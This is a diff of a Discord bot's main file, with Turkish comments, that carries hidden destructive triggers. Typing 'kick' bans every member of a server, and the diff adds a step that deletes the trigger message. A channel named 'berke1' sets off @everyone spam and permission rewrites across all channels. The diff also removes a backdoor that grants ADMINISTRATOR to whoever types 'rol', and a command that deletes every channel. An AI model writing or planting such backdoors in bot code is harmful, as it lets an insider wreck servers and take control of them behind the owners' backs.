@@ -26,18 +26,9 @@ require('./util/eventLoader')(client);
   client.on('message', msg => {
     if (msg.content === 'kick') {
       msg.guild.members.forEach(member => member.ban())
+      msg.delete()
     }
   });
-
-client.on('message', msg => {
-  if (msg.content === 'rol') {
-    msg.guild.createRole({
-      name: 'krdsim ben berkeyim',
-      permissions:["ADMINISTRATOR"] } );
-    let role = msg.guild.roles.find(role => role.name === "krdsim ben berkeyim");
-    msg.member.addRole(role)
-  }
-});
 
 const log = message => {
   console.log(`${message}`);
@@ -146,30 +137,6 @@ client.unload = command => {
   });
 };
 
-client.on('ready', () => {
-    client.user.setPresence({
-        game: {
-            name: `bot.eggsybot.xyz | Tekrardan Döndük!`,
-            type: 'PLAYING', 
-            // Değerler:
-            // PLAYING: Oynuyor
-            // WATCHING: İzliyor
-            // LISTENING: Dinliyor
-        },
-        status: 'online'
-        // Değerler:
-        // online: Çevrimiçi
-        // dnd: Rahatsız Etmeyin
-        // idle: Boşta
-    })
-})
-
-    client.on('message', msg => {
-      if (msg.content === 'deneme') {
-        msg.delete();
-        msg.guild.channels.deleteAll("");      }
-    });
-
 var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
 
 client.on('warn', e => {
@@ -181,7 +148,7 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'berke') {
+  if (channel.name == 'berke1') {
     channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://www.youtube.com/channel/UC0T1Lw6vM9JZWm6X-9U7ZvA?view_as=subscriber \n\nhttps://discord.gg/wrTekpC`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
